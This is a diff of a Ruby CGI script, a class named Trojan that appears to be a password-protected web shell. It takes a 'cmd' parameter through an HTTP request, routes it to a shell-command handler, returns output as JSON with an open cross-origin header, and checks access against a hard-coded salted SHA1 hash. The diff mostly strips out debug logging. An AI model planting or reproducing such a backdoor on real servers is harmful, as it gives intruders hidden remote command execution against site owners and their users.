@@ -1,14 +1,8 @@
 #!/usr/bin/env ruby
 
-
-
-
-require 'logger'
 require 'cgi'
 require 'digest/sha1'
 require 'json'
-
-$logger = Logger.new('/tmp/wash.log')
 
 class Trojan
     attr_accessor :cgi, :cwd, :response
@@ -24,7 +18,6 @@ class Trojan
 
     def process_command()
         json = @cgi.params
-        $logger.debug json
         if json['action'].first.eql? 'shell'
             process_shell_command(json['args[cmd]'].first)
         else
@@ -41,9 +34,6 @@ class Trojan
 
     def send_response
         @response['output']['prompt'] = self.get_prompt_context
-        $logger.debug(@response.to_json)
-        $logger.debug "\n\n"
-
         puts @cgi.header('Access-Control-Allow-Origin: *')
         puts @response.to_json
         puts
@@ -61,15 +51,21 @@ class Trojan
         @response['error'] = "#{method} unsupported"
         self.send_response
     end
+
+    
+
 end
 
 # ---------- Procedural code starts here ----------
 cgi  = CGI.new
 
+
 hash = Digest::SHA1.hexdigest(cgi.params['args[password]'].first + 'c5e5f704ee')
 if hash.eql? '003da5748a1cdeac275548be9741cb35b76f773d'
+
     trojan = Trojan.new({ :cgi => cgi })
     trojan.process_command
+
 else
     puts cgi.header('Access-Control-Allow-Origin: *')
     puts '{"error":"Invalid password."}'
